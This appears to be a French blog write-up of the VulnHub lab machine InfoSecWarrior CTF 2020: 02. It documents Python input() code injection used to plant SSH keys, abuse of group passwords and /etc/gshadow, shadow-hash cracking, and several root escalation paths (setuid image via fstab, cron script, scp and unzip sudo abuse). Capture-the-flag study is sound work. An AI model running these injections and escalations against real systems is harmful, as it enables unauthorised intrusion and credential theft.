---
title: "Solution du CTF InfoSecWarrior CTF 2020: 02 de VulnHub"
tags: [CTF, VulnHub]
---

Le [précédent opus]({% link _posts/2023-04-03-Solution-du-CTF-InfoSecWarrior-2020-1-de-VulnHub.md %}) des CTFs de la série *InfoSecWarrrior* ne m'avait pas laissé un souvenir impérissable, mais ce [InfoSecWarrior CTF 2020: 02](https://vulnhub.com/entry/infosecwarrior-ctf-2020-02,447/) était plus abouti et très centré sur Linux. J'ai même découvert les passwords de groupe donc que du bon.

## Evaluation

Un scan de port révèle la présence d'un SSH et d'un serveur custom visiblement écrit en Python (d'après le traceback que Nmap a généré malgré lui) :

```
Nmap scan report for 192.168.56.173
Host is up (0.00028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
56563/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     Welcome to 
|     ____ __ __ _ 
|     ___/ ___| ___ __\x20\x20 / /_ _ _ __ _ __(_) ___ _ __ 
|     \x20/ _ / __\x20\x20/\x20/ / _` | '__| '__| |/ _ \| '__|
|     |__) | __/ (__ \x20V V / (_| | | | | | | (_) | | 
|     |___|_| |_|_| ___/____/ ___|___| _/_/ __,_|_| |_| |_|___/|_| 
|     Please input number of ping packet you want to send??: Traceback (most recent call last):
|     File "./script.py", line 18, in <module>
|     int(input(' Please input number of ping packet you want to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   NULL: 
|     Welcome to 
|     ____ __ __ _ 
|     ___/ ___| ___ __\x20\x20 / /_ _ _ __ _ __(_) ___ _ __ 
|     \x20/ _ / __\x20\x20/\x20/ / _` | '__| '__| |/ _ \| '__|
|     |__) | __/ (__ \x20V V / (_| | | | | | | (_) | | 
|     |___|_| |_|_| ___/____/ ___|___| _/_/ __,_|_| |_| |_|___/|_| 
|_    Please input number of ping packet you want to send??
```

Le code appelle la fonction `input() `de Python. Pour les besoins du CTF on peut imaginer que Python 2 est utilisé, car dans cette version cette fonction est capable d'interpréter du code Python. On ne peut toutefois pas appeler directement les objets, il faut utiliser quelques moyens détournés, mais ça fonctionne :

```console
$ ncat 192.168.56.173 56563 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.173:56563.
Welcome to 
 

  ___        __      ____          __        __              _            
 |_ _|_ __  / _| ___/ ___|  ___  __\ \      / /_ _ _ __ _ __(_) ___  _ __ 
  | || '_ \| |_ / _ \___ \ / _ \/ __\ \ /\ / / _` | '__| '__| |/ _ \| '__|
  | || | | |  _| (_) |__) |  __/ (__ \ V  V / (_| | |  | |  | | (_) | |   
 |___|_| |_|_|  \___/____/ \___|\___| \_/\_/ \__,_|_|  |_|  |_|\___/|_|   
                                                                          


 Please input number of ping packet you want to send??: __import__("os").system("id")
uid=1001(bla1) gid=1001(bla1) groups=1001(bla1)
ping target (CTF.InfoSecWarrior)...
```

On va s'ajouter comme autorisés pour les connexions SSH au compte `bla1` :

```console
$ ncat 192.168.56.173 56563 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.173:56563.
Welcome to 
 

  ___        __      ____          __        __              _            
 |_ _|_ __  / _| ___/ ___|  ___  __\ \      / /_ _ _ __ _ __(_) ___  _ __ 
  | || '_ \| |_ / _ \___ \ / _ \/ __\ \ /\ / / _` | '__| '__| |/ _ \| '__|
  | || | | |  _| (_) |__) |  __/ (__ \ V  V / (_| | |  | |  | | (_) | |   
 |___|_| |_|_|  \___/____/ \___|\___| \_/\_/ \__,_|_|  |_|  |_|\___/|_|   
                                                                          


 Please input number of ping packet you want to send??: __import__("os").system("mkdir -p /home/bla1/.ssh/;echo ssh-rsa AAAA--- snip ---nV7Ez8/h >> /home/bla1/.ssh/authorized_keys")
ping target (CTF.InfoSecWarrior)...
```

## T'es trop VIP

Une fois connecté on trouve un fichier concernant l'utilisateur `bla2`. Il mentionne un mot de passe de groupe :

```console
$ ssh -i ~/.ssh/key_no_pass bla1@192.168.56.173
(-(-_(-_-)_-)-) (-(-_(-_-)_-)-) (-(-_(-_-)_-)-)

        ░░░░░░░░▄██████▄ Do this and I will give you a Hint
        ░░░░░░░█▀▀▀██▀▀▀▄
        ░░░░░░░█▄▄▄██▄▄▄█ Laugh uncontrollably for about 3 minutes
        ░░░░░░░▀█████████       then suddenly stop and look suspiciously 
        ░░░░░░░░▀███▄███▀░░          at everyone who looks at you.
        ░░░░░░░░░▀████▀░░░░░                Or
        ░░░░░░░▄████████▄░░░░ Enumerate Hostname and Distro's codename of this box
        ░░░░░░████████████░░░░       And try to get Secure SHell

(-(-_(-_-)_-)-) (-(-_(-_-)_-)-) (-(-_(-_-)_-)-)

PS: For Newbie refer this website to know more : google.co.in
bla1@ck04:~$ ls -alh
total 32K
drwxr-x--- 5 bla1 bla1 4.0K Apr 12 00:34 .
drwxr-xr-x 6 root root 4.0K Jan 28  2020 ..
lrwxrwxrwx 1 root root    9 Jan 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 root root   55 Feb 12  2020 bla2-note
drwx------ 3 bla1 bla1 4.0K Apr 12 00:34 .gnupg
-rw-r--r-- 1 root root    0 Feb 13  2020 .hushlogin
drwxrwxr-x 3 bla1 bla2 4.0K Feb 14  2020 .local
-rwxr-xr-x 1 bla1 bla1   87 Jan 27  2020 run.sh
-rwxr-xr-x 1 bla1 bla1  819 Feb 13  2020 script.py
drwxrwxr-x 2 bla1 bla1 4.0K Apr 12 00:33 .ssh
bla1@ck04:~$ cat bla2-note
My group password is czNjcjN0
I encoded my gpasswd :-P
bla1@ck04:~$ echo czNjcjN0 | base64 -d
s3cr3t
```

En parlant de groupe, voyons les fichiers liés au groupe de l'utilisateur :

```console
bla1@ck04:~$ find / -group bla2 -ls 2> /dev/null
   789933      4 drwxrwx---   3 bla2     bla2         4096 Feb 14  2020 /home/bla2
   789434      4 drwxrwxr-x   3 bla1     bla2         4096 Feb 14  2020 /home/bla1/.local
   789808      4 drwx------   3 bla1     bla2         4096 Feb 14  2020 /home/bla1/.local/share
   789834      4 drwx------   2 bla1     bla2         4096 Feb 14  2020 /home/bla1/.local/share/nano
   529369      4 -rw-------   1 root     bla2         1025 Jan 28  2020 /var/backups/gshadow.bak
   531982     12 -rw-r--r--   1 root     bla2        10304 Feb 13  2020 /var/backups/apt.extended_states.1.gz
   142366      4 -rw-rw----   1 root     bla2         1025 Jan 28  2020 /etc/gshadow
   138591      4 -rw-rw----   1 root     bla2         1012 Jan 28  2020 /etc/gshadow-
```

Les habitués de Linux ont déjà dû apercevoir les programmes `gpasswd` ou le fichier `gshadow` sur leur système. Un petit coup de manpage ne peut pas faire de mal :

[gpasswd(1): administer /etc/group//etc/gshadow - Linux man page](https://linux.die.net/man/1/gpasswd)

> The **gpasswd** command is used to administer /etc/group, and /etc/gshadow. Every group can have administrators, members and a password.
> 
> ...
> 
> If a password is set the members can still use newgrp without a password, and non-members must supply the password.

[newgrp(1): log in to new group - Linux man page](https://linux.die.net/man/1/newgrp)



> **newgrp** changes the current real group ID to the named group, or to the default group listed in /etc/passwd if no group name is given. **newgrp** also tries to add the group to the user groupset. If not root, the user will be prompted for a password if she does not have a password (in /etc/shadow if this user has an entry in the shadowed password file, or in /etc/passwd otherwise) and the group does, or if the user is not listed as a member and the group has a password.

On apprend deux choses : il est possible d'associer un mot de passe à un groupe d'utilisateur et il est possible de changer dynamiquement de GID avec la commande `newgrp` et la saisie du mot de passe :

```console
bla1@ck04:~$ newgrp bla2
Password: 
bla1@ck04:~$ id
uid=1001(bla1) gid=1002(bla2) groups=1002(bla2),1001(bla1)
bla1@ck04:~$ cd /home/bla2/
bla1@ck04:/home/bla2$ ls -al
total 152
drwxrwx--- 3 bla2 bla2   4096 Feb 14  2020 .
drwxr-xr-x 6 root root   4096 Jan 28  2020 ..
lrwxrwxrwx 1 root root      9 Jan 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 root root 135168 Jan 27  2020 db.sqlite3
-rw-r--r-- 1 root root      0 Feb 13  2020 .hushlogin
-rwxrwxr-x 1 bla2 bla2    248 Jan 27  2020 manage.py
drwxrwxr-x 6 bla2 bla2   4096 Jan 27  2020 mysite
-rw-rw-r-- 1 bla1 bla2     38 Feb 14  2020 run.sh
```

Je n'ai rien trouvé d'intéressant dans la base de données sqlite.

La possibilité de changer de groupe est intéressante, mais à quelle point est-ce utilisable ? Y a-t-il beaucoup de fichier en `g+w` ?

```console
bla1@ck04:/home/bla2$ find /etc/ -perm -g+w -type f -ls 2> /dev/null 
   132345      4 -rw-rw-r--   1 root     root          150 Jan 27  2020 /etc/default/keyboard
   131266      4 -rw-rw-r--   1 root     root          350 Jan 27  2020 /etc/popularity-contest.conf
   142366      4 -rw-rw----   1 root     bla2         1138 Apr 12 01:14 /etc/gshadow
   138591      4 -rw-rw----   1 root     bla2         1012 Jan 28  2020 /etc/gshadow-
   133470      4 -rw-rw-r--   1 root     root            3 Jan 27  2020 /etc/papersize
   131074      4 -rw-rw-r--   1 root     root          550 Jan 27  2020 /etc/fstab
   131464      4 -rw-rw-r--   1 root     root         2904 Jan 27  2020 /etc/apt/sources.list
   131749      4 -rw-rw-r--   1 root     root           49 Jan 27  2020 /etc/apt/apt.conf.d/00aptitude
   138586      4 -rw-rw-r--   1 root     root           40 Jan 27  2020 /etc/apt/apt.conf.d/00trustcdrom
```

Ce n'est pas énorme, mais je vois déjà deux possibilités d'exploitation :

* On peut utiliser le groupe `bla2` pour modifier `/etc/gshadow` et par conséquence mettre un mot de passe sur le groupe de notre choix (et donc utiliser `newgrp` dans la foulée)

* Avec le groupe `root` on peut éditer `/etc/fstab`

Pour rajouter un mot de passe sur le groupe `root` je copie juste la ligne du groupe `bla2` et je modifie son libellé.

Je peux alors lire le contenu de deux fichiers intéressants :

```
   132414      4 -rw-r-----   1 root     shadow       1914 Feb 13  2020 /etc/shadow
   131280      4 -r--r-----   1 root     root          967 Feb 13  2020 /etc/sudoers
```

Voici un extrait du fichier `sudoers` :

```
# User privilege specification

bla     ALL=NOPASSWD:/usr/bin/virtualbox,/usr/bin/unzip
shortcut ALL=NOPASSWD:/bin/echo,/usr/bin/id,/usr/bin/whatis
shortcut ALL=(bla:bla) /usr/bin/scp,/bin/cat,/bin/cp
# Members of the admin group may gain root privileges
#%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
#%sudo  ALL=(ALL:ALL) ALL
%bla    ALL=(bla) NOPASSWD: ALL
%bla2   ALL=(bla2) NOPASSWD: /usr/bin/man
```

Et concernant le `shadow` je casse le hash du compte `shortcut` (`shortcut`) et celui de `ck04` (`bionic`).

## La méthode à l'ancienne

Ma première idée était de modifier `/etc/fstab` pour permettre de monter une image disque dans laquelle j'aurais placé un binaire setuid root :

```
/var/tmp/disk.img    /mnt    ext2    rw,user,exec,suid 0 0
```

J'ai choisi de mettre l'image dans `/var/tmp` car une tache cron supprime apparemment ce qui se trouve dans `/tmp`.

Je crée un fichier vide de 10Mo que je formate en ext2 :

```console
bla1@ck04:/home/bla2$ dd if=/dev/zero of=disk.img bs=1024 count=10240
10240+0 records in
10240+0 records out
10485760 bytes (10 MB, 10 MiB) copied, 0.0701639 s, 149 MB/s
bla1@ck04:/home/bla2$ mkfs.ext2 disk.img 
mke2fs 1.44.1 (24-Mar-2018)
Discarding device blocks: done                            
Creating filesystem with 10240 1k blocks and 2560 inodes
Filesystem UUID: d7f46770-9726-443f-8e00-d4792228e0a7
Superblock backups stored on blocks: 
        8193

Allocating group tables: done                            
Writing inode tables: done                            
Writing superblocks and filesystem accounting information: done

bla1@ck04:/home/bla2$ cp disk.img /var/tmp/
```

J'ai ensuite récupéré l'image sur ma machine ainsi que `/bin/dash`. Je place alors le binaire dans l'image montée et je lui ajoute le bit setuid root :

```console
$ scp -i ~/.ssh/key_no_pass bla1@192.168.56.173:/var/tmp/disk.img .
$ scp -i ~/.ssh/key_no_pass bla1@192.168.56.173:/bin/dash .
$ sudo mount -t ext2 disk.img /mnt/
$ sudo mv dash /mnt/
$ sudo chown root:root /mnt/dash
$ sudo chmod 4755 /mnt/dash
$ ls -al /mnt/dash
-rwsr-xr-x 1 root root 121432 11 avril 22:09 /mnt/dash
$ sudo umount /mnt
```

Une fois renvoyée sur la VM, je peux monter l'image et exécuter le shell setuid :

```console
bla1@ck04:/home/bla2$ mount /var/tmp/disk.img 
bla1@ck04:/home/bla2$ ls -al /mnt/
total 137
drwxr-xr-x  3 root root   1024 Apr 12 01:40 .
drwxr-xr-x 25 root root   4096 Apr 12 00:00 ..
-rwsr-xr-x  1 root root 121432 Apr 12 01:39 dash
drwx------  2 root root  12288 Apr 12 01:36 lost+found
bla1@ck04:/home/bla2$ /mnt/dash -p
# id
uid=1001(bla1) gid=0(root) euid=0(root) groups=0(root),1001(bla1),1002(bla2)
# cd /root
# ls
proof.txt
# cat proof.txt
_________        ___.                 ____  __.      .__       .__     __    _______      _____  
\_   ___ \___.__.\_ |__   ___________|    |/ _| ____ |__| ____ |  |___/  |_  \   _  \    /  |  | 
/    \  \<   |  | | __ \_/ __ \_  __ \      <  /    \|  |/ ___\|  |  \   __\ /  /_\  \  /   |  |_
\     \___\___  | | \_\ \  ___/|  | \/    |  \|   |  \  / /_/  >   Y  \  |   \  \_/   \/    ^   /
 \______  / ____| |___  /\___  >__|  |____|__ \___|  /__\___  /|___|  /__|    \_____  /\____   | 
        \/\/          \/     \/              \/    \/  /_____/      \/              \/      |__|

flag = 1876056353cb2e6253fd0ce121ef1b3f

This flag is a proof that you got the root shell.
You have to submit your report contaning all steps you take to got root shell.
Send your report at our e-mail address : ctf@infosecwarrior.com & vishalbiswas420@gmail.com
```

## La méthode pspy

Dans la crontab de root, il y a cette entrée :

```
* * * * * cd /home/bla1 && ./run.sh
```

On ne peut pas la lire sans les droits root mais on aurait aperçu la commande en exécutant `pspy`.

Le fichier est sous notre contrôle, on pourrait donc faire exécuter des commandes par `root` en le modifiant et en le rendant exécutable :

```
-rw-rw-r-- 1 bla1 bla2       38 Feb 14  2020 run.sh
```

## La méthode GTFObins

On peut se servir des entrées que l'on a vues dans la crontab avec les comptes cassés. On commence par `shortcut` qui peut lancer `scp` en tant que `bla` :

```console
bla1@ck04:/home/bla2$ su shortcut
Password: 
$ sudo -l
Matching Defaults entries for shortcut on ck04:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shortcut may run the following commands on ck04:
    (root) NOPASSWD: /bin/echo, /usr/bin/id, /usr/bin/whatis
    (bla : bla) /usr/bin/scp, /bin/cat, /bin/cp
$ echo 'sh 0<&2 1>&2' > /var/tmp/yolo
$ chmod +x /var/tmp/yolo
$ sudo -u bla /usr/bin/scp -S /var/tmp/yolo x y:
$ id
uid=1000(bla) gid=1000(bla) groups=1000(bla),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

Ensuite on va utiliser l'entrée `sudoers` autorisant `bla` à lancer `unzip` en tant que `root`.

Pour cela je crée une arborescence comme si j'étais à la racine, puis je la compresse :

```console
$ mkdir -p root/.ssh
$ cp ~/.ssh/key_no_pass.pub root/.ssh/authorized_keys
$ zip -r archive root/
  adding: root/ (stored 0%)
  adding: root/.ssh/ (stored 0%)
  adding: root/.ssh/authorized_keys (deflated 16%)
$ scp -i ~/.ssh/key_no_pass archive.zip  bla1@192.168.56.173:/var/tmp/
```

Sur la VM je me mets dans la racine et je décompresse :

```console
$ cd /    
$ sudo /usr/bin/unzip /var/tmp/archive.zip
Archive:  /var/tmp/archive.zip
   creating: root/.ssh/
  inflating: root/.ssh/authorized_keys
```

Et ça passe :

```console
$ ssh -i ~/.ssh/key_no_pass root@192.168.56.173
(-(-_(-_-)_-)-) (-(-_(-_-)_-)-) (-(-_(-_-)_-)-)

        ░░░░░░░░▄██████▄ Do this and I will give you a Hint
        ░░░░░░░█▀▀▀██▀▀▀▄
        ░░░░░░░█▄▄▄██▄▄▄█ Laugh uncontrollably for about 3 minutes
        ░░░░░░░▀█████████       then suddenly stop and look suspiciously 
        ░░░░░░░░▀███▄███▀░░          at everyone who looks at you.
        ░░░░░░░░░▀████▀░░░░░                Or
        ░░░░░░░▄████████▄░░░░ Enumerate Hostname and Distro's codename of this box
        ░░░░░░████████████░░░░       And try to get Secure SHell

(-(-_(-_-)_-)-) (-(-_(-_-)_-)-) (-(-_(-_-)_-)-)

PS: For Newbie refer this website to know more : google.co.in
root@ck04:~# id
uid=0(root) gid=0(root) groups=0(root)
```


